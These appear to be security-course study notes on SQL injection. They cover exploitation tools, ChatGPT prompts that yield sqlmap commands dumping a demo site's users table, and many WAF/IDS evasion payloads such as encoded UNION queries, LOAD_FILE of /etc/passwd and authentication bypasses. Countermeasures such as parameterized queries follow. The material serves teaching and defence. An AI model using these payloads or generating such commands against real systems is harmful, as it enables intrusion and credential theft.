					- Mole is an automatic SQL injection exploitation tool. By simply providing a vulnerable URL and a valid string on the site, it can detect and exploit SQL injection vulnerabilities using either the UNION technique or a Boolean query-based technique. Mole features a command-line interface (CLI) that allows users to specify actions easily. The CLI also supports auto-completion for both commands and command arguments, reducing the need for manual input.
					- Key Features of Mole:
						- Supports multiple database management systems, including MySQL, PostgreSQL, SQL Server, and Oracle.
						- Automates SQL injection exploitation using the UNION technique.
						- Supports automatic blind SQL injection exploitation.
						- Can exploit SQL injection vulnerabilities in GET, POST, and Cookie parameters.
						- Includes filters to bypass certain IPS/IDS rules using generic filters, with the flexibility to create custom filters.
						- Can exploit SQL injection vulnerabilities that return binary data.
					- Attackers use Mole to exploit SQL injection vulnerabilities through techniques such as UNION-based and blind SQL injection.
				- jSQL Injection (github.com)
				- NoSQLMap (github.com)
				- Havij (github.com)
				- blind_sql_bitshifting (github.com)
			- Discovering SQL Injection Vulnerabilities with AI:
				- With the aid of AI, attackers can efficiently perform SQL injection attacks on target web applications. For example, an attacker could attempt to use AI tools like ChatGPT to generate SQL injection commands. By providing a prompt such as: "Identify all possible SQL injection vulnerabilities on the target URL: http://testphp.vulnweb.com"
				- The AI might generate the following command: sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3
				- The sqlmap command automates SQL injection testing by crawling the target site, identifying vulnerabilities, and using high-risk techniques while evading detection.
			- Checking for Boolean-Based SQL Injection with AI:
				- With the aid of AI, attackers can efficiently perform Boolean-based SQL injection attacks on target web applications. For example, an attacker could use ChatGPT to generate an appropriate prompt, such as: "Check for Boolean-based SQL injection on the target URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
				- This prompt attempts to assess the target URL for Boolean-based SQL injection vulnerabilities and extract database information from the server.
				- Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --technique=B --dbs
				- This sqlmap command tests for Boolean-based SQL injection on the target URL by specifying --technique=B. It runs in non-interactive mode (--batch), automating the process, and attempts to enumerate databases on the server using --dbs.
			- Checking for Error-Based SQL Injection with AI:
				- With AI, attackers can efficiently perform error-based SQL injections on target web applications. An attacker could use ChatGPT to generate appropriate prompts, such as:
				- Example 1:
					- Prompt: "Perform an error-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the tables in the acuart database."
					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=E --dbs && sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
					- This command uses sqlmap to test for error-based SQL injection (--technique=E) on the target URL and, if vulnerable, enumerate available databases (--dbs). If the attack is successful, it then targets the "acuart" database (-D acuart) and retrieves a list of its tables (--tables). The && ensures that the second command runs only if the first one succeeds.
				- Example 2:
					- Prompt: "Perform an error-based SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1, and if vulnerable, enumerate the database and the users table in the acuart database."
					- Generated Command:
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=E --dbs && \
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables && \
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns && \
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
					- This sqlmap command automates an error-based SQL injection attack on the target URL. First, it checks for vulnerabilities (--technique=E) and enumerates available databases (--dbs). If successful, it targets the "acuart" database, retrieving its tables (--tables), then focuses on the "users" table, listing its columns (--columns). Finally, it extracts all data from the "users" table (--dump). The && ensures each step runs only if the previous one succeeds.
			- Checking for Time-Based SQL Injection with AI:
				- Attackers can leverage AI-powered technologies to perform time-based blind SQL injection on target web applications. An attacker could use AI tools like ChatGPT to generate prompts and corresponding commands, such as:
				- Example 1:
					- Prompt: "Check for time-based blind SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T --dbs
					- This command checks for time-based blind SQL injection (--technique=T) on the target URL and enumerates available databases (--dbs).
				- Example 2:
					- Prompt: "Check for time-based blind SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate tables in the acuart database."
					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart --tables
					- After confirming the vulnerability, this command specifically retrieves tables (--tables) from the "acuart" database (-D acuart).
				- Example 3:
					- Prompt: "Check for time-based blind SQL injection on the target URL http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the users table in the acuart database."
					- Generated Command:
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart -T users --columns && \
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T -D acuart -T users --dump
					- This extends the attack by first listing columns in the "users" table (--columns) and then dumping its data (--dump) after exploiting the SQL injection vulnerability.
			- Checking for UNION-Based SQL Injection with AI:
				- Attackers can leverage AI-powered technologies to automate UNION-based SQL injection attacks on target web applications. Using AI tools like ChatGPT, an attacker can generate prompts and corresponding commands, such as:
				- Example 1:
					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the database."
					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U --dbs
					- This command tests for UNION-based SQL injection (--technique=U) on the target URL and enumerates available databases (--dbs).
				- Example 2:
					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate tables in the acuart database."
					- Generated Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart --tables --risk=3 --level=5
					- This command increases the scan’s thoroughness using higher risk (--risk=3) and test levels (--level=5), then retrieves tables (--tables) from the "acuart" database (-D acuart).
				- Example 3:
					- Prompt: "Check for UNION-based SQL injection on the target URL with the parameter http://testphp.vulnweb.com/listproducts.php?cat=1 and enumerate the users table in the acuart database."
					- Generated Command:
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --columns && \
						sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U -D acuart -T users --dump
					- This command first retrieves column names from the "users" table (--columns) and then extracts all user data (--dump) from the database.
	- Evasion Techniques:
		- Firewalls and intrusion detection systems (IDS) can detect SQL injection attempts based on predefined signatures. Even if these network security measures are in place, attackers employ evasion techniques to bypass detection and execute SQL injection. Such techniques include hex encoding, whitespace manipulation, inline comments, sophisticated pattern matching, character encoding, and more.
		- Evading IDS:
			- An Intrusion Detection System (IDS) is deployed on a network to detect malicious activities. Typically, it operates based on either a signature or an anomaly detection model. To detect SQL injection, an IDS sensor is placed at the database server to inspect SQL statements.
			- Attackers use IDS evasion techniques to obscure input strings, preventing detection by signature-based detection systems. A signature is a regular expression that describes a string pattern associated with a known attack. In a signature-based IDS, the system must be aware of the attack beforehand to detect it. The system constructs a database of attack signatures and then analyzes input strings against this database at runtime. If any input matches an attack signature, the IDS triggers an alarm.
			- This issue is particularly common in network-based IDS (NIDS) and signature-based NIDS. As a result, attackers attempt to bypass these systems using various signature evasion techniques. These techniques include different encoding methods, packet input fragmentation, altering expressions to their equivalent forms, inserting white spaces, and more.
			- Types of Signature Evasion Techniques:
				- In-line Comment: Inserts in-line comments between SQL keywords to obscure input strings.
				- Character Encoding: Uses built-in character encoding functions (e.g., CHAR()) to represent characters.
				- String Concatenation: Creates SQL keywords by concatenating text using database-specific instructions.
				- Obfuscated Code: Constructs SQL statements in a way that makes them difficult to interpret.
				- Manipulating White Spaces: Inserts white spaces between SQL keywords to obscure input strings.
				- Hex Encoding: Represents an SQL query string using hexadecimal encoding.
				- Sophisticated Matches: Uses alternative expressions for OR 1=1 to avoid detection.
				- URL Encoding: Obscures input strings by adding a percent sign (%) before each code point.
				- Null Byte Injection: Inserts a null byte (%00) before a string to bypass detection mechanisms.
				- Case Variation: Mixes uppercase and lowercase letters within an SQL statement to evade detection.
				- Declare Variables: Uses variables to pass specially crafted SQL statements, bypassing the detection mechanism.
				- IP Fragmentation: Splits attack payloads into multiple packet fragments to evade signature-based detection.
				- Variations: Uses a WHERE statement that always evaluates as TRUE, allowing mathematical or string comparisons to be used for evasion.
			- Evasion Technique: In-line Comment:
				- An evasion technique is effective when a signature-based filter removes white spaces from input strings. In this method, an attacker obfuscates the input string using in-line comments. These comments create SQL statements that may appear syntactically incorrect but remain valid, allowing attackers to bypass input filters.
				- In-line comments enable an attacker to write SQL statements without using traditional white spaces. For example, /* ... */ is used in SQL to delimit multi-line comments.
				- Example:
					- '/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--
					- Attackers can also inject in-line comments within SQL keywords to further evade detection: '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--
					- This technique effectively breaks up SQL keywords while keeping the query functional, making it harder for signature-based intrusion detection systems to recognize malicious input.
			- Evasion Technique: Character Encoding:
				- The CHAR() function allows an attacker to encode common injection variables within an input string to evade detection by network security signatures. This function converts hexadecimal or decimal values into characters that can easily pass through SQL engine parsing. In MySQL, the CHAR() function can be used for SQL injection without requiring double quotes.
				- Examples:
					- Loading files in UNION queries (e.g., /etc/passwd): ' UNION SELECT 1, (LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))), 1, 1, 1;
					- Injecting without quotes (e.g., %): ' OR username LIKE CHAR(37);
					- Injecting a username without quotes (e.g., "root"): ' UNION SELECT * FROM users WHERE login = CHAR(114,111,111,116);
					- Checking for existing files (e.g., "n.ext"): ' AND 1 = (IF((LOAD_FILE(CHAR(110,46,101,120,116)) <> CHAR(39,39)), 1, 0));
				- By encoding SQL queries in this manner, attackers can bypass signature-based detection systems, making it more challenging for security mechanisms to identify malicious input.
			- Evasion Technique: String Concatenation:
				- This technique breaks a single string into multiple pieces and concatenates them at the SQL level. The SQL engine then reconstructs the original string from these fragments. Attackers use concatenation to obfuscate identifiable keywords, helping them evade intrusion detection systems. The concatenation syntax varies across different databases.
				- Signature-based detection is ineffective against such concatenated strings because traditional signature verification compares only the strings on both sides of the = sign. A simple string can be split into multiple parts and then reassembled using concatenation operators.
				- For example:
					- SQL Server:
						- Uses the + operator
						- Example: OR 'Simple' = 'Sim' + 'ple'
					- Oracle:
						- Uses the || operator
						- Example: '; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
					- Microsoft SQL Server (MSSQL):
						- Example: '; EXEC ('DRO' + 'P T' + 'AB' + 'LE')
					- MySQL:
						- Uses the CONCAT function
						- Example: '; EXECUTE CONCAT('INSE', 'RT US', 'ER')
				- By using string concatenation, attackers can bypass detection mechanisms that rely on fixed keyword patterns. This technique allows them to construct malicious SQL statements dynamically instead of using direct, easily identifiable queries.
			- Evasion Technique: Obfuscated Code:
				- Attackers can obfuscate malicious SQL queries to evade detection by an Intrusion Detection System (IDS) using two primary methods:
				- Wrapping:
					- Attackers use a wrap utility to obfuscate a malicious SQL query before sending it to the database. Since the obfuscated query does not match known IDS signatures, it bypasses detection and is allowed to execute.
				- SQL String Obfuscation:
					- In this method, SQL strings are obfuscated using techniques such as:
						- Concatenation of SQL strings
						- Encrypting or hashing strings and decrypting them at runtime
					- These obfuscation techniques prevent IDS from detecting known malicious patterns, allowing attackers to bypass signature-based detection.
					- Examples of Obfuscated Code for the String "qwerty":
						- REVERSE(CONCAT(IF(1, CHAR(121), 2), 0x74, RIGHT(LEFT(0x567210, 2), 1), LOWER(MID('TEST', 2, 1)), REPLACE(0x7074, 'pt', 'w'), CHAR(INSTR(123321, 33) + 110)))
						- CONCAT(UNHEX(LEFT(CRC32(31337), 3) - 400), UNHEX(CEIL(ATAN(1) * 100 - 2)), UNHEX(ROUND(LOG(2) * 100) - 4), CHAR(114), CHAR(RIGHT(COT(31337), 2) + 54), CHAR(POW(11, 2)))
					- Bypassing IDS Signatures with Obfuscation:
						- An attacker can modify a malicious request to avoid signature-based detection.
						- Example of a Standard Attack Signature: /?id=1+union+(select+1,2+from+test.users)
						- Obfuscated Variants to Evade Detection:
							- /?id=(1)unIon(selEct(1), mid(hash,1,32) from (test.users))
							- /?id=1+union+(sELect '1', CONCAT(login, hash) from test.users)
							- /?id=(1)union(((((((select(1), HEX(hash) from (test.users))))))))
						- By altering case sensitivity, adding unnecessary parentheses, or using SQL functions creatively, attackers can bypass IDS rules that rely on static pattern matching.
			- Evasion Technique: Manipulating White Spaces:
				- Modern signature-based SQL injection detection engines can identify attacks that involve variations in the number and encoding of white spaces around malicious SQL code. However, these engines often fail to detect the same payload when spaces are removed or manipulated.
				- The white space manipulation technique obfuscates input strings by adding, removing, or replacing white spaces between SQL keywords, strings, or numeric literals—without altering the execution of the SQL statement.
				- Methods of White Space Manipulation:
					- Using Special Characters:
						- Inserting tabs (\t), carriage returns (\r), or line feeds (\n) instead of regular spaces can make an SQL statement harder to detect.
						- Example:
							- UNION
							- SELECT
						- This is different from the standard "UNION SELECT" signature, making it harder for detection systems to recognize.
					- Removing Spaces:
						- Some SQL databases allow execution without spaces, making queries difficult to match against IDS signatures.
						- Example:
							- 'OR'1'='1'
							- This is still a valid SQL injection attempt, even though it lacks spaces.
				- By exploiting these techniques, attackers can bypass signature-based detection and successfully execute SQL injection attacks while evading security filters.
			- Evasion Technique: Hex Encoding:
				- Hex encoding is an evasion technique that represents strings in hexadecimal format. Attackers use hex encoding to obfuscate SQL queries, making them difficult for security measures, such as Intrusion Detection Systems (IDS), to recognize. Since most IDS do not analyze hex-encoded inputs effectively, attackers can exploit this weakness to bypass SQL injection protections. Hex encoding provides numerous ways to obfuscate URLs and SQL statements.
				- Example of Hex Encoding in SQL Injection:
					- The string 'SELECT' can be represented in hexadecimal as: 0x73656c656374
					- This obfuscated version is less likely to be detected by signature-based security mechanisms.
				- Executing an Obfuscated SQL Query Using Hex Encoding:
					DECLARE @x VARCHAR(80);
					SET @x = 0x73656c65637420404076657273696f6e;
					EXEC (@x);
				- Note: This statement does not use single quotes ('), further reducing the likelihood of detection.
				- Additional Examples of Hex Encoding:
					SELECT @@version = 0x73656c65637420404076657273696f6e
					DROP TABLE CreditCard = 0x44524f50205461626c652043726564697443617264
					INSERT INTO USERS ('certifiedhacker', 'qwerty') = 0x494e5345525420696e746f2055534552532028276365727469666965646861636b6572272c20277177657274792729
				- By converting SQL keywords into hexadecimal format, attackers can evade detection mechanisms while still executing malicious queries successfully.
			- Evasion Technique: Sophisticated Matches:
				- Signature-based detection systems are effective at catching common SQL injection patterns, such as "OR 1=1". These detection mechanisms rely on regular expressions to identify various variations of classical injection patterns. However, attackers can bypass these signatures using sophisticated matches—alternative expressions that achieve the same effect as the classical match "OR 1=1" but with slight modifications.
				- Using Sophisticated Matches to Bypass Detection:
					- Attackers can use equivalent expressions to trick authentication systems. For example, instead of the commonly detected "OR 1=1", an attacker might use: OR 'john' = 'john'
					- Since this expression always evaluates to true, it effectively bypasses authentication.
					- If the system blocks this variation, an attacker can modify it further by adding 'N' to the second string: OR 'john' = N'john'
					- This small change helps evade detection in advanced security systems that rely on strict signature matching.
				- Common SQL Injection Characters and Operators:
					- Attackers also use special SQL characters and operators to manipulate queries and evade detection:
					=> ' or " -> String delimiters
					=> -- or # -> Single-line comment indicators
					=> /*...*/ -> Multi-line comment indicators
					=> + -> Addition or string concatenation (or space in URLs)
					=> || -> String concatenation (double pipe)
					=> % -> Wildcard character in LIKE queries
					=> ?Param1=foo&Param2=bar -> URL parameter manipulation
					=> PRINT -> Executes non-transactional commands
					=> @variable -> Local variable
					=> @@variable -> Global variable
					=> WAITFOR DELAY '0:0:10' -> Introduces a time delay
				- Examples of Sophisticated Matches for Evading Signature Detection:
					- Instead of using ' OR 1=1', attackers can modify the query as follows:
					=> OR 'john' = 'john'
					=> ' OR 'microsoft' = 'micro' + 'soft'
					=> ' OR 'movies' = N'movies'
					=> ' OR 'software' LIKE 'soft%'
					=> ' OR 7 > 1
					=> ' OR 'best' > 'b'
					=> ' OR 'whatever' IN ('whatever')
					=> ' OR 5 BETWEEN 1 AND 7
				- These variations produce the same logical outcome as "OR 1=1" but are harder for signature-based security mechanisms to detect.
				- By leveraging these techniques, attackers can effectively evade detection and exploit vulnerabilities in authentication systems.
			- Evasion Technique: URL Encoding:
				- URL encoding is a technique used to bypass input filters and obfuscate SQL queries to launch injection attacks. This is achieved by replacing characters with their ASCII codes in hexadecimal form, preceded by a percent sign (%).
				- For example, the ASCII code for a single quotation mark (') is 0x27; therefore, its URL-encoded representation is %27. Attackers exploit this technique to bypass security filters.
				- Example:
					- A normal SQL query: ' UNION SELECT Password FROM Users_Data WHERE name='Admin'--
					- After URL encoding, this query becomes: %27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94
				- Double URL Encoding:
					- In some cases, basic URL encoding is insufficient to bypass filters. To counter this, attackers use double URL encoding, which involves encoding the already URL-encoded characters again.
					- For instance, the URL-encoded form of a single quotation mark (') is %27. After double URL encoding, it becomes %2527 (% itself is encoded as %25).
					- Example:
						- After double URL encoding, the previously encoded query transforms into: %2527%2520UNION%2520SELECT%2520Password%2520FROM%2520Users_Data%2520WHERE%2520name%253D%2527Admin%2527%25E2%2580%2594
					- This technique allows attackers to evade security mechanisms that only filter standard URL-encoded payloads, making it a significant concern in web security.
			- Evasion Technique: Null Byte:
				- A null byte (%00) injection attack involves inserting a null byte character before a string to bypass detection mechanisms. Web applications typically use high-level languages such as PHP and ASP alongside lower-level languages like C/C++. However, in C and C++, the null byte (\0) is used to terminate strings. This difference in string-handling approaches can be exploited to execute a null byte injection attack.
				- Example:
					- An attacker may attempt to extract a password from a database using the following SQL query: ' UNION SELECT Password FROM Users WHERE UserName='admin'--
					- If the server is protected by a Web Application Firewall (WAF) or an Intrusion Detection System (IDS), the attacker can prepend a null byte (%00) to the query to evade detection: %00' UNION SELECT Password FROM Users WHERE UserName='admin'--
					- By injecting a null byte, the attacker can potentially bypass security filters and retrieve the admin password.
				- This technique is particularly effective against applications that mishandle null bytes, making it a serious security concern in web development.
			- Evasion Technique: Case Variation:
				- By default, most database servers treat SQL queries as case-insensitive. Because regular expression filters in security mechanisms may also be case-insensitive, attackers can bypass detection by mixing uppercase and lowercase letters within an SQL injection payload.
				- Example:
					- Suppose a security filter is designed to detect the following SQL queries:
						union select user_id, password from admin where user_name='admin'--
						UNION SELECT USER_ID, PASSWORD FROM ADMIN WHERE USER_NAME='ADMIN'--
					- An attacker can easily evade the filter by altering the case of individual characters:
						UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--
				- Since SQL is case-insensitive, the database will still process the query correctly, while the inconsistent casing may help the attacker bypass detection mechanisms.
				- This technique highlights the importance of using robust input validation and query parameterization to prevent SQL injection attacks.
			- Evasion Technique: Declare Variables:
				- During a web session, an attacker carefully observes SQL queries to identify opportunities for extracting sensitive data from the database. By analyzing these queries, the attacker can identify variables that allow them to pass a series of specially crafted SQL statements. This technique enables them to construct an SQL injection attack that bypasses signature-based detection mechanisms.
				- Example:
					- An attacker may initially attempt a simple SQL injection query: UNION SELECT Password
					- To evade detection, the attacker can redefine the SQL statement using a variable, such as @sqlvar:
						; DECLARE @sqlvar NVARCHAR(70);
						SET @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N' Password');
						EXEC(@sqlvar);
					- By dynamically constructing the SQL query using string concatenation, the attacker can evade Intrusion Detection Systems (IDS) and successfully retrieve all stored passwords from the database.
				- This technique demonstrates the importance of parameterized queries and strict input validation to prevent SQL injection attacks.
			- Evasion Technique: IP Fragmentation:
				- IP fragmentation is a technique attackers use to evade Intrusion Detection Systems (IDS) and Web Application Firewalls (WAF) by intentionally splitting an IP packet into multiple small fragments. Since an IDS or WAF must first reassemble fragmented packets to analyze their content, attackers exploit this limitation to bypass detection.
				- Because each fragment is inspected individually, the attack string may not match any known signatures, making detection difficult. Additionally, attackers can modify these fragments further to complicate reassembly and conceal the attack payload.
				- Common Techniques for Evasion Using IP Fragmentation:
					- Pausing transmission: Attackers delay sending attack fragments, hoping the IDS times out before the target system reassembles the packets.
					- Sending packets in reverse order.
					- Reordering fragments: Sending packets in the correct order except for:
						- The first fragment, which is sent last.
						- The last fragment, which is sent first.
					- Sending packets out of order or in random sequences to disrupt reassembly.
				- By leveraging these techniques, attackers can bypass network security mechanisms, emphasizing the need for deep packet inspection (DPI) and stateful traffic analysis to detect such evasive tactics.
			- Evasion Technique: Variation:
				- Variation is an evasion technique that allows an attacker to bypass comparison-based security filters. This is achieved by injecting carefully crafted statements into an SQL query, often using logical conditions or string manipulations that always evaluate to true.
				- For example, an attacker may insert expressions such as: ' OR '1'='1'
				- This causes the SQL engine to interpret the condition as a string comparison rather than a numerical comparison. Since evaluating two identical strings always returns true, just as evaluating equivalent numeric values does, the query remains logically unaffected but bypasses security controls.
				- Example:
					- An attacker may attempt to exploit an authentication query like this:
						SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 --
						SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 --
						SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 --
						SELECT * FROM accounts WHERE userName = 'Bob' OR "evade" = "ev" + "ade" --
					- Each of these variations ensures that the WHERE clause always evaluates to true, allowing the attacker to gain unauthorized access or manipulate database results.
				- Since there are infinite possible variations, signature-based detection mechanisms struggle to block every possible form of this attack. To prevent such attacks, it is crucial to use parameterized queries, strict input validation, and allowlist-based filtering instead of relying solely on blacklist signatures.
	- SQL Injection Countermeasures:
		- Why Are Web Applications Vulnerable to SQL Injection Attacks?
			- The database server runs OS commands:
				- Some database servers execute OS commands to perform specific tasks. An attacker who exploits SQL injection can use these commands to carry out unauthorized operations.
			- Using a privileged account to connect to the database:
				- Developers sometimes assign high-privilege accounts to database users. If an attacker compromises such an account, they can access the database and execute malicious operations at the OS level.
			- Error messages revealing sensitive information:
				- If a user inputs incorrect data or if a query is structured improperly, the database server may return an error message. These messages can expose critical details about the database, which an attacker can use to gain unauthorized access.
			- Lack of server-side data validation:
				- This is one of the most common vulnerabilities leading to SQL injection attacks. Many applications either do not validate user input properly or fail to do so altogether, allowing attackers to inject malicious SQL code into queries.
			- Complex software stacks:
				- Modern web applications often rely on multi-layered architectures with various technologies. This complexity makes it challenging to consistently enforce security measures across the entire stack. Discrepancies in how different layers handle data can introduce vulnerabilities.
			- Legacy code and backward compatibility:
				- Many web applications still use outdated codebases that were not designed with modern security practices in mind. Attackers can exploit vulnerabilities in older code by injecting malicious SQL queries to gain unauthorized access, modify data, or even take full control of the database.
			- Reliance on concatenated queries:
				- Using string concatenation to construct SQL queries is highly risky because it makes it easy for attackers to manipulate query structures. Even seemingly harmless inputs can be altered to introduce malicious SQL code, leading to data breaches and system compromises.
		- Defending Against SQL Injection Attacks:
			- Implementing consistent coding standards, minimizing privileges, and firewalling the server can all help protect against SQL injection attacks.
			- Minimizing Privileges:
				- Developers often overlook security during application development, leaving it for the final stages of the project. However, security should be a top priority from the beginning. Developers should create low-privilege accounts first and only grant additional permissions as needed. Addressing security early allows for seamless integration of security measures alongside feature development, making it easier to identify and fix vulnerabilities. Additionally, working within a security framework from the start ensures developers become familiar with best practices, resulting in a more secure product. This proactive approach prevents last-minute security scrambles when customers discover that the application violates their security policies by requiring excessive privileges.
			- Implementing Consistent Coding Standards:
				- Database developers should consider security at every stage of application development and integrate it into their solutions. Adhering to well-documented coding standards and security policies ensures consistency and reduces vulnerabilities.
				- For instance, developers often use different data access methods, each with its own security implications. Standardizing data access practices ensures consistency and strengthens security across the application.
				- Another critical security practice is input validation at both the client and server levels. While client-side validation helps reduce server load and improve performance, it should never be the only validation method. A malicious user can bypass client-side checks and submit dangerous input. Server-side validation ensures that all user input is properly sanitized before being processed.
				- Additionally, applications should avoid displaying default error messages that may reveal system details. Instead, they should use custom error messages that provide minimal or no information about the system to prevent attackers from gaining insights into the database structure.
			- Firewalling the SQL Server:
				- Firewalling the SQL server ensures that only trusted clients can access it. In most web environments, only the administrative network (if available) and web servers interacting with the database should have access. Typically, the SQL server only needs to communicate with a backup server.
				- By default, SQL Server listens on named pipes (via Microsoft networking on TCP ports 139 and 445), as well as TCP port 1433 and UDP port 1434. Properly securing and restricting access to these ports can help mitigate risks such as:
					- Developers uploading unauthorized or insecure scripts and components to the web server
					- Misapplied patches that introduce vulnerabilities
					- Administrative errors that compromise security
		- Countermeasures Against SQL Injection:
			- To defend against SQL injection, developers must follow best practices and implement security measures throughout the development process. Below are key countermeasures to mitigate SQL injection risks:
			- Input Validation & Sanitization:
				- Do not assume the size, type, or content of incoming data; validate and sanitize all user input.
				- Enforce strict data type checks and size limits to prevent buffer overruns.
				- Accept only expected values for string variables, rejecting entries with binary data, escape sequences, or comment characters.
				- Perform input validation on both the client and server side using whitelists rather than blacklists.
			- Secure Query Execution:
				- Use prepared statements and parameterized queries to prevent SQL injection.
				- Never construct SQL queries directly from user input; use stored procedures where applicable.
				- Keep untrusted data separate from commands and queries.
				- Avoid constructing dynamic SQL with concatenated input values.
			- Access Control & Authentication:
				- Apply the principle of least privilege when assigning database access permissions.
				- Use the most restrictive SQL account types for applications and never share database accounts across multiple applications.
				- Disable unnecessary database functionalities, including shell access (xp_cmdshell).
				- Remove default database accounts to minimize attack surfaces.
				- Outsource authentication workflows using OAUTH APIs to securely manage user credentials.
			- Application & Server Security:
				- Ensure web configuration files do not contain sensitive information.
				- Regularly update and patch all software components.
				- Implement a web application firewall (WAF) to filter malicious inputs.
				- Avoid extended or overly long URLs that could trigger stack-based buffer overflows.
				- Ensure that code tracing and debug messages are removed before deployment.
				- Handle exceptions securely without disclosing database error information to end users.
			- Monitoring & Intrusion Detection:
				- Deploy network, host, and application intrusion detection systems to monitor for SQL injection attacks.
				- Regularly review and monitor SQL statements from database-connected applications to detect suspicious activity.
				- Conduct automated black-box injection testing, static code analysis, and manual penetration testing.
			- Secure Development Practices:
				- Use a secure API that offers a parameterized interface or eliminates the need for direct SQL execution.
				- Employ object-relational mapping (ORM) frameworks like Hibernate or Spring Data JPA to abstract SQL queries and provide built-in SQL injection protection.
				- Convert user input (such as usernames and passwords) into strings before validation.
				- Use secure hashing algorithms (e.g., SHA-256) instead of storing plaintext passwords.
				- Design applications to trap and handle exceptions properly.
			- Database & Data Protection:
				- Utilize views to restrict access to base tables and enforce data transformations.
				- Regularly monitor and analyze database logs for unusual query patterns.
				- Ensure database isolation by locking web servers into separate domains.
				- Use data access abstraction layers to enforce consistent and secure data handling across applications.
		- Use Type-Safe SQL Parameters:
			- Enforce type and length checks using the parameter collection so that the input is treated as a literal value instead of executable code.
				SqlDataAdapter myCommand = new SqlDataAdapter("AuthLogin", conn);
				myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;
				SqlParameter parm = myCommand.SelectCommand.Parameters.Add("@aut_id", SqlDbType.VarChar, 11);
				parm.Value = Login.Text;
			- In this example, the @aut_id parameter is treated as a literal value instead of executable code. This value is checked for type and length.
			- The following is an example of vulnerable code:
				SqlDataAdapter myCommand = new SqlDataAdapter("LoginStoredProcedure '" + Login.Text + "'", conn);
			- The following is an example of secure code:
				SqlDataAdapter myCommand = new SqlDataAdapter(
					"SELECT aut_lname, aut_fname FROM Authors WHERE aut_id = @aut_id", conn);
				SqlParameter parm = myCommand.SelectCommand.Parameters.Add("@aut_id", SqlDbType.VarChar, 11);  
				parm.Value = Login.Text;
			- Preventing SQL Injection Attacks:
				- Use type-safe SQL parameters as demonstrated above.
				- Protect the web server with Web Application Firewalls (WAF) and Intrusion Detection Systems (IDS) to filter malicious packets.
				- Regularly update software with security patches to mitigate vulnerabilities.
				- Sanitize and filter user input to prevent injection attacks.
				- Analyze source code for SQL injection vulnerabilities.
				- Minimize third-party applications that may introduce security risks.
				- Use stored procedures and parameterized queries for secure database access.
				- Disable verbose error messages to prevent attackers from gathering useful information.
				- Implement custom error pages to hide system details.
				- Use non-privileged database accounts and grant the least possible privileges to users.
				- Disable high-risk commands such as xp_cmdshell, which can execute OS-level commands.
		- Defenses in the Application:
			- Input Validation:
				- Input validation ensures that the data provided to the application is sanitized before being processed by the database. The primary approach involves validating user-supplied input using techniques such as whitelisting and blacklisting. Proper input validation helps developers prevent malicious data from influencing the logic of the code.
				- Whitelist Validation:
					- Whitelist validation is a best practice in which only explicitly approved data types, ranges, sizes, and values are accepted. It is also referred to as positive validation or inclusion.
					- This validation method is commonly implemented using regular expressions. For example, characters allowed in whitelist validation may include ^\ {} () @ | ? $. However, implementing whitelist validation can be complex in cases where the expected input is difficult to define or includes large character sets.
				- Blacklist Validation:
					- Blacklist validation prevents the application from accepting malicious input by rejecting disallowed characters, strings, or patterns. This technique is also known as negative validation or exclusion.
					- Blacklist validation is typically implemented using regular expressions to prohibit certain characters or strings. Examples of blacklisted characters include: '|%|--|;|/\*|\\\*|_|\[|@|xp_
					- However, blacklist validation alone is not sufficient, as attackers can use unexpected inputs to bypass restrictions. Therefore, it is recommended to use blacklisting in combination with whitelisting. A more secure approach to preventing SQL injection is to use both blacklist validation and output encoding to ensure that input is properly sanitized before reaching the database.
			- Output Encoding:
				- Output encoding is an additional validation technique that ensures input data is properly sanitized before being passed to the database. This is particularly important when dynamic SQL queries are used.
				- For instance, consider the following example where a dynamically generated SQL query fails due to a special character:
					String myQuery = “INSERT INTO UserDetails VALUES (‘” + first_name + ”‘,’” + last_name + ”’);”
				- An attacker could inject malicious input into the first_name field, as shown below:
					'','',''); DROP TABLE UserDetails--
